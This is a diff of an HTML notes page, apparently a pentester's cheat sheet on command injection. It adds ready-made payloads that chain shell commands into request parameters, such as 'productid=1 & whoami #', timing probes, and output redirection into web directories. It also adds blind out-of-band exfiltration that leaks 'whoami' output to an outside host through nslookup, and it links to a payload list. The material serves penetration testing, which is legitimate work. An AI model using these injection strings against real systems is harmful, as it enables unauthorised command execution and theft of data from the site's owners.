@@ -65,7 +65,19 @@
 
 <!--==================== MAIN ====================-->
     <main class="main"><article id="7fcb8bba-ff66-41fe-a477-c37f4edbaefd" class="page sans"><header><h1 class="page-title">Command Injection</h1></header><div class="page-body"><ul id="885ff212-5916-4cd3-9a7b-5b2512cbb241" class="bulleted-list"><li style="list-style-type:disc">Search for cmd= in URLS</li></ul><ul id="a2729614-b2c9-47a1-a5a3-9b8dbe18c208" class="bulleted-list"><li style="list-style-type:disc">search for inputs that allow for system level commands to be executed…</li></ul><ul id="5734953b-c3dc-4b9b-bdce-5c38eb424791" class="bulleted-list"><li style="list-style-type:disc">Follow this guide for checks: <a href="https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection">https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection</a></li></ul><p id="19269227-16d2-4e10-93eb-737a08203951" class="">
-</p><p id="1071b24a-9cb3-4fc9-955d-3714e91c017f" class="">Payloads:</p><p id="310bd382-674f-4432-a482-2819a83bfac8" class=""><a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></p><pre id="93605604-da82-41b4-9287-e8e74ac6b700" class="code"><code>--------------------------------------------------------------------
+</p><p id="1071b24a-9cb3-4fc9-955d-3714e91c017f" class=""><strong>Payloads:</strong></p><p id="310bd382-674f-4432-a482-2819a83bfac8" class=""><a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></p><pre id="93605604-da82-41b4-9287-e8e74ac6b700" class="code"><code>Examples (Also URL encoding these payloads)
+#Regular
+productid=1 &amp; whoami #
+#Out of band
+&amp; sleep 10 #
+#Output redirection
+&amp; whoami &gt; /valid/accessible/path.txt#
+#Blind, Out-of-band
+&amp; nslookup &lt;website&gt; #
+#Blind, Out-of-band Data Exfiltration
+&amp; nslookup `whoami`.&lt;website&gt; #
+&amp; nslookup $(whoami).&lt;website&gt; #
+--------------------------------------------------------------------
 Special Characters
 &amp;
 ;
@@ -117,8 +129,9 @@ vuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /
 /var/www/
 /var/www/html/
 /var/www/public/
-/var/www/static/</code></pre><p id="1604092a-6529-45ae-8939-24a3311a3dbc" class="">
-</p><figure id="505bab18-e96d-4c14-b139-08c38caf0bff" class="link-to-page"><a href="Command%20Injection%207fcb8bbaff6641fea477c37f4edbaefd/Command%20Injection%20505bab18e96d4c14b13908c38caf0bff.html">Command Injection</a></figure></div></article></main></main>
+/var/www/static/
+/images/</code></pre><p id="1604092a-6529-45ae-8939-24a3311a3dbc" class="">
+</p></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
